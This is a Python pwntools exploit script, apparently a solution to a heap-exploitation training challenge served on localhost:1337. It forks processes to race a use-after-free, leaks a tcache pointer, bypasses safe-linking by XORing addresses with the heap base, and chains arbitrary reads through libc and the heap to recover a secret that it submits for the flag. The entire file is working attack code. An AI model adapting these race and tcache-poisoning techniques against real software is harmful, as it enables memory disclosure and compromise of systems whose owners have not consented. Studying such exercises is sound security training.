import time 
from pwn import *
import os

# Your existing constants
offset1 = 0x8a0 # from heap base to libc
offset2 = 0x60 # from libc to main heap 
offset3 = 0x250 # from main heap to secret's region
offset4 = 0xd70 # secret's address to secret
idx = 2

# Your existing functions (leak_tcache, controlled_allocations, arbitrary_read, exploit)
def leak_tcache(r1, r2):
    if os.fork() == 0:
        for _ in range(10000):
            r1.sendline(b"malloc 0")
            r1.sendline(b"scanf 0")
            r1.sendline(b"AAAABBBB")
            r1.sendline(b"free 0")
        exit(0)
    else:
        for _ in range(10000):
            r2.sendline(b"printf 0")
        os.wait()
    output_set = set(r2.clean().splitlines())
    print(output_set)
    for output in output_set:
        output = output[9:]
        if output[:1] != b'\x41' and b'\x07' in output:
            result = output[:6]
            print(result)
            return u64(result.ljust(8, b'\x00'))
    return 0

def controlled_allocations(r1, r2, addr, heap_base_addr):
    global idx
    r1.clean()
    r2.clean()
    
    addr_packed = p64(addr ^ heap_base_addr)
    xor_result = addr ^ heap_base_addr
    print(f"addr: {hex(addr)}")
    print(f"heap_base: {hex(heap_base_addr)}")  
    print(f"XOR result: {hex(xor_result)}")
    r1.sendline(f"malloc {idx}".encode())
    r1.sendline(f"malloc {idx + 1}".encode())
    r1.sendline(f"free {idx + 1}".encode())
    
    while True:
        print("Running Arbitrary Read on Address: ", hex(addr))
        if os.fork() == 0:
            r1.sendline(f"free {idx}".encode())
            os.kill(os.getpid(), 9)
        else:
            r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
            os.wait()
        
        time.sleep(0.1)
        
        r1.sendline(f"malloc {idx}".encode())
        r1.sendline(f"printf {idx}".encode())
        r1.readuntil(b"MESSAGE: ")
        stored = r1.readline()[:-1]
        
        if stored == addr_packed.split(b'\x00')[0]:
            break
    r1.sendline(f"malloc {idx + 1}".encode())
    r1.clean()
    idx += 2

def arbitrary_read(r1, r2, addr, heap_base_addr):
    global idx
    controlled_allocations(r1, r2, addr, heap_base_addr)
    r1.sendline(f"printf {idx - 1}".encode())
    r1.readuntil(b"MESSAGE: ")
    output = r1.readline()[:-1]
    leak = u64(output.ljust(8, b'\x00')) 
    return leak

def exploit(r1, r2, p):
    global offset1, offset2, offset3, offset4
    
    leak = leak_tcache(r1, r2)
    if leak:
        print("tcache next pointer: ", hex(leak))
        
        location1 = (leak << 12) + offset1
        leak2 = arbitrary_read(r1, r2, location1, leak)
        print("second leak: ", hex(leak2))

        location2 = leak2 + offset2
        print("location2: ", hex(location2))
        leak3 = arbitrary_read(r1, r2, location2, leak + 1)
        print("Third leak: ", hex(leak3))

        location3 = leak3 - offset3
        print("location3: ", hex(location3))
        leak4 = arbitrary_read(r1, r2, location3, leak + 1)
        print("Fourth leak: ", hex(leak4))
        
        location4 = leak4 - offset4
        print("Final location: ", hex(location4))
        secret = arbitrary_read(r1, r2, location4, leak + 2)
        secret = secret.to_bytes(8, 'little')
        print(f"Secret string: {secret}")

        r1.clean()
        r1.sendline(b"send_flag")
        r1.recvuntil(b"Secret: ")
        r1.sendline(secret)
        response = r1.recvall(timeout=2)
        print(f"Server response: {response}")
        return True  # Success
    else:
        print("Failed to leak")
        return False  # Failed

def cleanup_connections(p, r1, r2):
    """Clean up all connections"""
    try:
        r1.close()
    except:
        pass
    try:
        r2.close()
    except:
        pass
    try:
        p.kill()
    except:
        pass

def run_single_attempt():
    """Run a single exploit attempt"""
    global idx
    idx = 2  # Reset idx for each attempt
    
    p = process('./babyprime_level3.0_patched')
    time.sleep(0.5)  # Let the process start
    
    try:
        r1 = remote("localhost", 1337)
        r2 = remote("localhost", 1337)
        
        success = exploit(r1, r2, p)
        cleanup_connections(p, r1, r2)
        return success
        
    except Exception as e:
        print(f"Exception during attempt: {e}")
        cleanup_connections(p, r1, r2)
        return False

def main():
    max_attempts = 10  # Maximum number of attempts
    
    for attempt in range(1, max_attempts + 1):
        print(f"\n{'='*50}")
        print(f"ATTEMPT {attempt}/{max_attempts}")
        print(f"{'='*50}")
        
        if run_single_attempt():
            print(f"\n🎉 SUCCESS on attempt {attempt}!")
            break
        else:
            print(f"❌ Attempt {attempt} failed")
            if attempt < max_attempts:
                print("Retrying in 2 seconds...")
                time.sleep(2)
    else:
        print(f"\n💥 All {max_attempts} attempts failed!")

if __name__ == "__main__":
    main()
